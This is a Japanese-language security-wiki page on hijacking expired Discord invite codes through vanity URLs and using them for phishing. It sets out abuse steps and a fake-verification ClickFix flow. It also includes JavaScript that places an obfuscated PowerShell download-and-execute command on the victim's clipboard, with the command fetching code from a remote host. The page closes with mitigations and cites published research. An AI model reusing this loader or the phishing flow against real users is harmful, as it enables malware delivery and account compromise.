# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discordの招待システムの脆弱性により、脅威アクターは期限切れまたは削除された招待コード（一時的、永久的、またはカスタムバニティ）を新しいバニティリンクとして主にレベル3ブーストされたサーバーで主張することができます。すべてのコードを小文字に正規化することで、攻撃者は既知の招待コードを事前に登録し、元のリンクが期限切れになるか、ソースサーバーがブーストを失うと静かにトラフィックをハイジャックできます。

## 招待タイプとハイジャックリスク

| 招待タイプ               | ハイジャック可能? | 条件 / コメント                                                                                       |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| 一時的招待リンク         | ✅          | 期限切れ後、コードは利用可能になり、ブーストされたサーバーによってバニティURLとして再登録される可能性があります。 |
| 永久的招待リンク         | ⚠️          | 削除され、小文字の文字と数字のみで構成されている場合、コードは再び利用可能になる可能性があります。        |
| カスタムバニティリンク    | ✅          | 元のサーバーがレベル3ブーストを失うと、そのバニティ招待は新しい登録のために利用可能になります。    |

## 悪用手順

1. 偵察
- 公共のソース（フォーラム、ソーシャルメディア、Telegramチャンネル）で`discord.gg/{code}`または`discord.com/invite/{code}`のパターンに一致する招待リンクを監視します。
- 興味のある招待コード（一時的またはバニティ）を収集します。
2. 事前登録
- レベル3ブースト特権を持つDiscordサーバーを作成するか、既存のサーバーを使用します。
- **サーバー設定 → バニティURL**で、ターゲット招待コードを割り当てようとします。受け入れられた場合、そのコードは悪意のあるサーバーによって予約されます。
3. ハイジャックのアクティベーション
- 一時的招待の場合、元の招待が期限切れになるまで待ちます（または、ソースを制御している場合は手動で削除します）。
- 大文字を含むコードの場合、小文字のバリアントはすぐに主張できますが、リダイレクトは期限切れ後にのみアクティブになります。
4. 静かなリダイレクション
- ハイジャックがアクティブになると、古いリンクを訪れるユーザーは攻撃者が制御するサーバーにシームレスに送信されます。

## Discordサーバーを介したフィッシングフロー

1. サーバーチャンネルを制限し、**#verify**チャンネルのみが表示されるようにします。
2. ボット（例：**Safeguard#0786**）を展開し、新規参加者にOAuth2を介して確認するよう促します。
3. ボットはユーザーをフィッシングサイト（例：`captchaguard.me`）にリダイレクトし、CAPTCHAまたは確認ステップのふりをします。
4. **ClickFix** UXトリックを実装します：
- 壊れたCAPTCHAメッセージを表示します。
- ユーザーに**Win+R**ダイアログを開き、事前にロードされたPowerShellコマンドを貼り付けてEnterを押すように誘導します。

### ClickFixクリップボードインジェクションの例
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
このアプローチは、直接的なファイルダウンロードを避け、ユーザーの疑念を下げるために馴染みのあるUI要素を活用します。

## 緩和策

- 少なくとも1つの大文字または非英数字を含む永久的な招待リンクを使用する（期限切れにならず、再利用不可）。
- 定期的に招待コードをローテーションし、古いリンクを無効にする。
- Discordサーバーのブースト状況とバニティURLの主張を監視する。
- ユーザーにサーバーの信頼性を確認し、クリップボードから貼り付けたコマンドを実行しないよう教育する。

## 参考文献

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include /banners/hacktricks-training.md}}
